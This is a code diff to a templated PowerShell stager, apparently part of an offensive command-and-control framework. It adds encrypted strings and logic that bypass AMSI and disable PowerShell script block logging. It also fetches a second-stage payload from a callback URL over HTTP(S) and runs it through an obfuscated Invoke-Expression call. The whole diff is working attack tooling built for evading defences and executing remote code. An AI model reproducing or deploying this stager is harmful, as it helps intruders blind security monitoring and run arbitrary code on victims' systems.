@@ -10,27 +10,55 @@ function {{symbol_name("Decrypt-String")}} {
   	)
     $result = [System.Convert]::FromBase64String($string)
     $result = {{symbol_name("Decrypt-Code")}} $result ${{symbol_name("KEY")}}
-    $result = [System.Text.Encoding]::ASCII.GetString($result)
+    $result = [System.Text.Encoding]::UTF8.GetString($result)
     $result
 }
 
+{# strings used for disabling powershell logging #}
+{% set strings = [
+    "Bypass.AMSI",
+    "System.Management.Automation.Utils",
+    "cachedGroupPolicySettings",
+    "NonPublic,Static",
+    "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",
+    "EnableScriptBlockLogging",
+    "Failed to disable AMSI, aborting",
+]%}
+
 {% for s in strings %}
-$string{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s}}"
+    $string{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s|rc4encrypt}}"
 {% endfor %}
 
-if ($PSVersionTable.PSVersion.Major -ge 5) {
-    {% include "powershell/am0nsec-amsi-bypass.ps1" %}
 
+
+if ($PSVersionTable.PSVersion.Major -ge 5) {
+    {% if amsibypass %}
+        {% include amsibypass %}
+    {% endif %}
+
+    {# Disable Logging #}
     $settings = [Ref].Assembly.GetType($string2).GetField($string3,$string4).GetValue($null);
     $settings[$string5] = @{}
     $settings[$string5].Add($string6, "0")
 }
 
-$K=new-object net.webclient
-$K.proxy=[Net.WebRequest]::GetSystemWebProxy()
-$K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials
-$code = {{symbol_name("Decrypt-String")}} ($K.downloadstring(${{symbol_name("CALLBACK_URL")}}+'{{stage2}}'))
+
+{% if transport in ['http', 'https'] %}
+    ${{symbol_name("WebClient")}} = $K{# defined in the launcher #}
+    function {{symbol_name("Transport-String")}} {
+        param([String]$1, [hashtable]$2)
+        $args = "?t={{transport}}"
+        foreach($k in $2.keys) { $args += "&$k=$($2[$k])" }
+        return {{symbol_name("Decrypt-String")}} (${{symbol_name("WebClient")}}.DownloadString("${{symbol_name("CALLBACK_URL")}}${1}${args}"))
+    }
+{% elif transport == 'smb' %}
+    {# TODO #}
+{% elif transport == 'dns' %}
+    {# TODO #}
+{% endif %}
+
+${{symbol_name("Code")}} = {{symbol_name("Transport-String")}} "{{stage2}}"
 
 {#clever obfuscation#}
-& (gcm i*k`e-e*n) $code
+& (gcm i*k`e-e*n) ${{symbol_name("Code")}}
 {{exec_clipboard_entry}}
